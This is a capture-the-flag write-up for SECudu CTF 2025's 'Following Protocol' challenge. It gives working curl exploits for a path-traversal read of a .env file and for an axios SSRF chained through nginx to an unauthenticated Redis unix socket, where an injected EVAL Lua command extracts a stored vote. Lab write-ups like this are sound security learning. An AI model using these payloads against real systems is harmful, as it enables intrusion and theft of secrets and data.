---
title: "Writup: Following Protocol SECudu CTF 2025"
date: 2025-07-03
---

I participated in a group for this year SECudu CTF and we encountered one
challenge that was too good not to do a writeup on. 

# Context
The entire CTF was around the theme of elections and democracy of Freedonia.
The Following Protocol challenge told us that the user "wbc" had not voted for
a valid party and simply asked to find out who they voted for.

Included in the challenge was a url to the instance as well as the source code.
The source code contained 4 directories and a docker compose file to start the
instance up.

![dir](/secudu/dir.png)

```yaml
services:
  redis:
    build:
      context: ./redis
      dockerfile: Dockerfile
    user: "0"
    command: >
      bash -c "chmod +x /init.sh /restore.sh && /init.sh"
    volumes:
      - redis-socket:/redis
      - ./redis/init.sh:/init.sh
      - ./redis/restore.sh:/restore.sh
      - ./redis/Alyssa_Chen.jpg:/1.jpg
      - ./redis/Elira_Voss.jpg:/2.jpg
      - ./redis/Henrik_Stahl.jpg:/3.jpg
      - ./redis/Marcus_Delane.jpg:/4.jpg
      - ./redis/Rhea_Kael.jpg:/5.jpg
    networks:
      - ctfnet

  nginx:
    image: openresty/openresty:alpine
    volumes:
      - ./nginx/default.conf:/etc/nginx/conf.d/default.conf
      - ./nginx/img.conf:/etc/nginx/conf.d/img.conf
      - redis-socket:/redis
    depends_on:
      - v1
      - v2
      - redis
    networks:
      ctfnet:
        aliases:
          - backend.wbc
          - img.backend.wbc

  v1:
    image: php:8.2-cli
    command: php -S 0.0.0.0:80 -t /app
    volumes:
      - ./php-backend:/app
    networks:
      ctfnet:
        aliases:
          - v1.backend.wbc
    hostname: v1.backend.wbc
  
  v2:
    build: ./python-backend
    volumes:
      - redis-socket:/redis
    networks:
      ctfnet:
        aliases:
          - v2.backend.wbc
    hostname: v2.backend.wbc

  node:
    build: 
      context: ./node-app
    ports:
      - "80:80"
    networks:
      - ctfnet
    depends_on:
      - nginx

volumes:
  redis-socket:

networks:
  ctfnet:
    driver: bridge

```

There are 4 containers. The nginx and the node containers act as a reverse
proxy. There is a redis container acting as a database and there are two api
projects. There seems to be a redis socket that is shared between v2, nginx and
the redis container itself.

The v1 project is not that interesting so we shall focus on all the
other projects.

# NGINX context
This project is deceptively simple. There are two config files.

One config acts as a proxy, changing the url path from
`http://backend.wbc/v1/xxx` to `http://v1.backend.wbc/xxx` to be able to
connect to the appropriate machine, as they are defined by their hostnames in
    the compose file.

![](/secudu/default_nginx.png)

The other config acts as an image server, providing images stored on the redis
database.

![](/secudu/img_nginx.png)

# redis context
Redis is pretty simple. There is a start script which starts redis using a
socket and disabling the port by provide the port 0 to bind to. The thing to
note here is that the permissions given to this socket is 777. So anyone or
anything can access this socket. Another important thing to note is that the
default redis container does NOT provide any authentication by design to help
with testing. So any commands sent to the redis container would not require
authentication.

![](/secudu/redis.png)

There is also another script that runs as a cron job. It resets the redis
container populating it with default data. Including the information regarding
wbc vote.

![](/secudu/redis2.png)

# Node context

This was the other reverse proxy in the project, it also serves the static
files to the user.

![](/secudu/node.png)

We can see that the versions have been pinned in the `package.json` file

![](/secudu/uwebsockets.png)

# V2 context
This is the main interaction point of the project. There are three methods of
interest here. `vote`, `certificate` and `encrypt_value`. Two of them act as
routes being the primary way to access this project.

The `vote` route demonstrates how the vote is actually initially fetched. We
can see that this method is not properly guarded against candidate names so any
candidate name could be set.

![vote_route_image](/secudu/voted.png)

The `encrypt_value` route tells us the encryption method, the values we need to
find and how to decrypt it. We require the certifier, the encrypted vote and
the encryption key to be able to decrypt this value.

![](/secudu/encrypt.png)

Finally, the certificate. This route creates and saves a pdf of the name and the certifier in a
pdf format if it is able to and sends that to the user.

![](/secudu/vote_confirm.png)


---

That should be all the context needed to solve the challenge, if you want to
solve it yourself. Read ahead if you want to know the solution.

# The certifier
The first piece of information that we will focus on finding is the certifier.

The `vote_confirm` method gives the certifier of any name inputted. So using
`wbc` as the name we can get the certifier. We can use the following curl
request to save the pdf.

```
curl --request POST \
      --url http://localhost/api/v2/certificate \
      --header 'Content-Type: application/x-www-form-urlencoded' \
      --header 'User-Agent: insomnia/11.2.0' \
      --data name=wbc > test.pdf
```

Opening the pdf we get our first bit of information.

![pdf](/secudu/pdf.png)

# The encryption key
Finding this was a bit more challenging. The key here is that what if the file
already existed.

![](/secudu/catch.png)

Here we can see that the way it handles it is by using a catch and logging that
information and sends out the file. So using an existing file name would
produce the previous file, it would not override that file.

Another thing to note is the way the path is constructed.

![path](/secudu/path.png)

This uses string interpolation without verifying the path. That means we can
use some directory traversal and read any arbitrary file we want. Reading the
`../.env` file gives us our second piece of information. The encryption key

```
curl --request POST \
            --url http://localhost/api/v2/certificate \
            --header 'Content-Type: application/x-www-form-urlencoded' \
            --header 'User-Agent: insomnia/11.2.0' \
            --data name=../.env
```

![curl_env](/secudu/curl_env.png)

# The encrypted vote
Now the final and most difficult part. Finding the encrypted vote. We struggled
hard for this trying many different things over the span of two weeks. From
trying to read sockets using our arbitrary read technique to trying to produce
a name that would cause some weirdness.

One piece of information was the locked version in the package.json. Looking up
the CVE for axios we see:

[https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6](https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6)

Server-side request forgery for axios and the version used has not been
patched. We also use the base URL which matches perfectly with the exploit.
That means we could use something like
`http://localhost/api/img/http://v1.backend.wbc/candidates` and be able
to access any internal hostnames that we want.

We thought we could use this and directly provide the redis-socket as a
hostname. However, this failed because redis has not opened any ports. So we
struggled with this for ages, wondering if this would help us to find anything.

Another thing that this exploit do is be able to skip the validation step of
the node application. We can put anything in `xx` below not limited by `v1`,
`v2`, ...
`http://localhost/api/img/http://nginx/xx/yy`

After a week, we stumbled upon a [forum
post](https://serverfault.com/questions/316157/how-do-i-configure-nginx-proxy-pass-node-js-http-server-via-unix-socket).
NGINX also directly uses proxy pass without anything and we pass the first
argument to the front and the second to the back. So what if we have a url like
this. Attempting this on a local instance.

`http://localhost/api/img/http://nginx/unix:/redis/redis.sock:/`

![axios](/secudu/axios.png)

Bingo, we hit the redis container. We do have an issue though, redis detects
the `HOST:` header and terminates the connection without sending the flag. We
stumbled upon this
[article](https://smarx.com/posts/2020/09/ssrf-to-redis-ctf-solution/) which
talks about using carriage returns to insert bulk strings to break up the Host
header. The solution did not exactly work here.

Using edgeshark (tool to view packets in docker containers) the way nginx
handles url encoding before proxying it to the server was odd. It would
actually translate the url encodings into regular text before sending it to the
proxy It would translate a `%0D` to a carriage return. However, it would cut
off the entire url when translating `%0A`. It turns out it would translate any
url encoding (except probably a few) before sending them to the server.

Setting up a test socket listener, we can see exactly what would be sent to the
unix socket.

```
curl --path-as-is -i -s -k -X 'PUT' \
              -H 'Host: localhost' -H 'Content-Length: 20' \
              --data-binary 'HGET wbc voted_for\x0d\x0a' \
              'http://localhost/api/img/http://nginx/unix:/redis/test2.sock:%22test%20wow/'
```

Using this we get the request:
```
socket-listener-1  | PUT "test wow.backend.wbc/ HTTP/1.0
socket-listener-1  | Host: localhost
socket-listener-1  | Connection: close
socket-listener-1  | Content-Length: 20
socket-listener-1  | Accept: application/json, text/plain, */*
socket-listener-1  | User-Agent: axios/1.8.1
socket-listener-1  | Accept-Encoding: gzip, compress, deflate, br
socket-listener-1  |
```

Another thing to note from the article talking about redis ssrf is that the
commands before the Host: actually are executed and not reversed.

So, we can use a SET or a HSET command at the start by setting the method to
those things. Redis does not have a way to move keys of different types, ie we
cannot get a thing set by HSET and get it with GET.

There is a small command in Redis that allows us to extract the key though. It
is the EVAL command. As any url encoding is accepted and actually decoded
before the redis instance, we can write a full lua script that fetches wbc
encrypted vote and sets it to a key of our choosing.

The command we want to achieve is therefore this:
```
EVAL "return redis.call('SET', 'img:2901390', redis.call('HGET','wbc','voted_for'))" 2
```

We put two arguments at the end for the HTTP header and part of the url that we
do not actually care about. EVAL can also be achieved by using the method.

We end up with this final curl script that fetches the command.

```
curl --path-as-is -i -s -k -X 'EVAL' \
          -H 'Host: localhost' -H 'Content-Length: 20' \
          --data-binary 'HGET wbc voted_for\x0d\x0a' \
          'http://localhost/api/img/http://nginx/unix:/redis/redis.sock:%22return%20redis.call%28%27SET%27%2C%20%27img%3A2901390%27%2C%20redis.call%28%27HGET%27%2C%27wbc%27%2C%27voted_for%27%29%29%22%202%20/'
```

We can then get the encrypted vote using the img api and directly getting `http://localhost/api/img/2901390`.

# Combining this

All together we now have all the parts to decrypt the string and get the flag.
